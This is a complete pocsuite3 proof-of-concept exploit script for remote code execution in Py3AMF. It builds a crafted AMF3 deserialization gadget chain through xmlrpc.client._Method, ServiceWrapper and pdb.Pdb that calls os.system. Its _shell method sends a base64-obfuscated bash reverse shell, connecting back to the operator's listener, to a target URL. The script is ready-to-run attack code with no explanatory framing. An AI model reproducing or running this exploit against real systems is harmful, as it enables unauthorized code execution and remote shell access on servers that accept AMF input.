#!/usr/bin/env python3
# encoding=utf-8
from pocsuite3.api import (
    POCBase, register_poc, requests, logger,
    Output, get_listener_ip, get_listener_port,
)
import base64
from pyamf import amf3, util

AMF = amf3


def serialize(obj):
    stream = util.BufferedByteStream()
    context = AMF.Context()
    encoder = AMF.Encoder(stream, context)
    encoder.writeElement(obj)
    return stream.getvalue()


def serialize_attrs(attrs):
    serialized_attrs = b""
    for key, value in attrs.items():
        serialized_attrs += serialize(key)[1:]
        if isinstance(value, Obj):
            serialized_attrs += value.serialize()
        else:
            serialized_attrs += serialize(value)
    serialized_attrs += serialize(None)
    return serialized_attrs


def serialized_data(cmd):
    serialized_obj = Obj(
        "pyamf.amf3.ByteArray",
        _len_changed=True,
        _len=48763,
        _get_len=Obj(
            "xmlrpc.client._Method",
            _Method__send=Obj(
                "xmlrpc.client._Method",
                _Method__send=Obj(
                    "pyamf.remoting.gateway.ServiceWrapper",
                    service=Obj(
                        "pdb.Pdb",
                        curframe=Obj("pyamf.adapters._weakref.Foo", f_globals={}),
                        curframe_locals={},
                        stdout=None
                    ),
                ),
                _Method__name="do_break",
            ),
            _Method__name=f"""__import__('os').system("{cmd}")
            """.strip(),
        ),
    ).serialize()
    serialized_obj = b"\x11" + serialized_obj
    data = (
            b"\x00\x03"
            + b"\x00\x00"
            + b"\x00\x01"
            + b"\x00\x01a"
            + b"\x00\x01b"
            + len(serialized_obj).to_bytes(4, "big") + serialized_obj
    )
    return data


class Obj:
    def __init__(self, name, **kwargs):
        self.name = name
        self.attrs = kwargs

    def serialize(self):
        serialized_obj = b"\x0a\x0b" + serialize(self.name)[1:]
        serialized_obj += serialize_attrs(self.attrs)
        return serialized_obj


class Poc(POCBase):
    author = 'HuTa0'
    vulID = ''
    name = 'Py3AMF 远程代码执行'
    vulDate = ''
    updateDate = ''
    appPowerLink = ''
    appName = ''
    url = ' '  # Add your target URL here
    appVersion = ''
    vulType = ''
    desc = ''
    samples = []
    install_requires = ['']
    dork = {'': ''}

    def _shell(self):
        url = self.url
        command = f"bash -i >& /dev/tcp/{get_listener_ip()}/{get_listener_port()} 0>&1"
        command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
        command = f"bash -c 'echo {command} | base64 -d | bash -i'"
        payload = serialized_data(f"{command}")
        try:
            requests.post(url, data=payload, timeout=None)
        except Exception as e:
            logger.error(e)

    def parse_output(self, result=None):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(Poc)
